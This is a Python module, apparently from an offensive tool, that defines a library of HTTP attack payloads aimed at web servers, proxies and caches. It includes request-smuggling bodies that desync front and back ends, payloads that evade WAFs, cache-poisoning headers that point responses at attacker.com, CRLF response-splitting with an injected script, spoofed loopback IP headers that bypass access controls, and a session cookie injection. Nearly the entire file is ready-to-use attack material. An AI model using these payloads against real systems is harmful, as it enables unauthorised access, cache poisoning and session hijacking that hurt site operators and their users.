"""
HTTP/3 Connection Contamination Attack Payloads

Provides AttackPayload definitions and PayloadGenerator for all exploitation
vectors: request smuggling, cache poisoning, and header injection.
"""

from dataclasses import dataclass, field
from typing import Dict, List


@dataclass
class AttackPayload:
    """Represents a single attack payload with associated headers and body."""
    name: str
    headers: Dict[str, str]
    body: str = ""
    description: str = ""


class PayloadGenerator:
    """Generates attack payloads for HTTP/3 connection contamination exploits."""

    # -----------------------------------------------------------------------
    # Request Smuggling Payloads (CL.TE / TE.CL / H2.TE desync)
    # -----------------------------------------------------------------------
    @staticmethod
    def get_request_smuggling_payloads() -> List[AttackPayload]:
        return [
            # CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
            AttackPayload(
                name="CL.TE Smuggling",
                description="Content-Length / Transfer-Encoding desync — prepends smuggled prefix to next victim request",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                    "Connection": "keep-alive",
                },
                body="0\r\n\r\nG",
            ),
            # TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
            AttackPayload(
                name="TE.CL Smuggling",
                description="Transfer-Encoding / Content-Length desync — injects a full secondary request",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Transfer-Encoding": "chunked",
                    "Connection": "keep-alive",
                },
                body=(
                    "5c\r\n"
                    "POST /admin HTTP/1.1\r\n"
                    "Host: TARGET\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 15\r\n"
                    "\r\n"
                    "x=1\r\n"
                    "0\r\n"
                    "\r\n"
                ),
            ),
            # HTTP/2 → HTTP/1 downgrade with TE injection
            AttackPayload(
                name="H2.TE Downgrade Smuggling",
                description="HTTP/2 to HTTP/1.1 downgrade with Transfer-Encoding injection via pseudo-header",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Transfer-Encoding": "chunked",
                    "te": "trailers",
                    "Connection": "keep-alive",
                },
                body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n",
            ),
            # Obfuscated TE header to bypass WAF/normalisation
            AttackPayload(
                name="TE Obfuscation Smuggling",
                description="Obfuscated Transfer-Encoding header to evade WAF normalisation",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "6",
                    "Transfer-Encoding": "xchunked",   # non-standard value
                    "Transfer-encoding": "chunked",    # duplicate with different case
                    "Connection": "keep-alive",
                },
                body="0\r\n\r\nG",
            ),
        ]

    # -----------------------------------------------------------------------
    # Cache Poisoning Payloads
    # -----------------------------------------------------------------------
    @staticmethod
    def get_cache_poisoning_payloads() -> List[AttackPayload]:
        return [
            # Unkeyed header — X-Forwarded-Host reflected in redirect / resource URLs
            AttackPayload(
                name="X-Forwarded-Host Cache Poison",
                description="Unkeyed X-Forwarded-Host header poisons cache with attacker-controlled host in response",
                headers={
                    "X-Forwarded-Host": "attacker.com",
                    "Cache-Control": "no-cache",
                },
            ),
            # Fat GET — body on a GET request parsed by back-end but ignored by cache key
            AttackPayload(
                name="Fat GET Cache Poison",
                description="GET request with body; back-end reads body param overriding query string — cache keyed on URL only",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "27",
                    "X-HTTP-Method-Override": "GET",
                },
                body="param=attacker_controlled_val",
            ),
            # X-Original-URL / X-Rewrite-URL routing override
            AttackPayload(
                name="X-Original-URL Cache Poison",
                description="Unkeyed routing header rewrites the path processed by the back-end while cache key remains /",
                headers={
                    "X-Original-URL": "/admin",
                    "X-Rewrite-URL": "/admin",
                    "Cache-Control": "no-cache",
                },
            ),
            # HTTP Response Splitting via injected newlines in a header value
            AttackPayload(
                name="Header Injection Response Splitting",
                description="CRLF injection in unkeyed header value forces response splitting and cache poisoning",
                headers={
                    "X-Forwarded-Host": "attacker.com\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
                    "Cache-Control": "no-cache",
                },
            ),
        ]

    # -----------------------------------------------------------------------
    # Header Injection Payloads
    # -----------------------------------------------------------------------
    @staticmethod
    def get_header_injection_payloads() -> List[AttackPayload]:
        return [
            # Host header injection — affects password-reset links, internal routing
            AttackPayload(
                name="Host Header Injection",
                description="Overrides virtual-host routing; can poison password-reset / OAuth redirect URLs",
                headers={
                    "Host": "attacker.com",
                    "X-Forwarded-Host": "attacker.com",
                },
            ),
            # IP spoofing via proxy headers — bypasses IP-based ACLs
            AttackPayload(
                name="X-Forwarded-For IP Spoofing",
                description="Spoofed originating IP to bypass IP-based access controls or rate limiting",
                headers={
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "X-Originating-IP": "127.0.0.1",
                    "X-Remote-IP": "127.0.0.1",
                    "X-Client-IP": "127.0.0.1",
                },
            ),
            # Internal routing override headers
            AttackPayload(
                name="Internal Routing Header Injection",
                description="Proxy/load-balancer headers that may override upstream routing decisions",
                headers={
                    "X-Original-URL": "/admin",
                    "X-Override-URL": "/admin",
                    "X-Rewrite-URL": "/admin",
                    "X-Custom-IP-Authorization": "127.0.0.1",
                },
            ),
            # CRLF injection in User-Agent / Referer
            AttackPayload(
                name="CRLF Injection via User-Agent",
                description="CRLF sequence injected into User-Agent to split the HTTP response",
                headers={
                    "User-Agent": "Mozilla/5.0\r\nInjected-Header: malicious-value",
                    "Referer": "https://attacker.com\r\nSet-Cookie: session=hijacked",
                },
            ),
            # HTTP/2 pseudo-header smuggling — injects prohibited headers
            AttackPayload(
                name="HTTP/2 Pseudo-Header Injection",
                description="Injects Transfer-Encoding and Connection headers that are forbidden in HTTP/2 but processed by HTTP/1.1 back-ends",
                headers={
                    "transfer-encoding": "chunked",
                    "connection": "keep-alive, Transfer-Encoding",
                    "te": "trailers",
                },
            ),
        ]

    # -----------------------------------------------------------------------
    # Unified accessor
    # -----------------------------------------------------------------------
    @staticmethod
    def get_all_payloads() -> Dict[str, List[AttackPayload]]:
        """Return all payload categories keyed by attack type."""
        return {
            "request_smuggling": PayloadGenerator.get_request_smuggling_payloads(),
            "cache_poisoning": PayloadGenerator.get_cache_poisoning_payloads(),
            "header_injection": PayloadGenerator.get_header_injection_payloads(),
        }
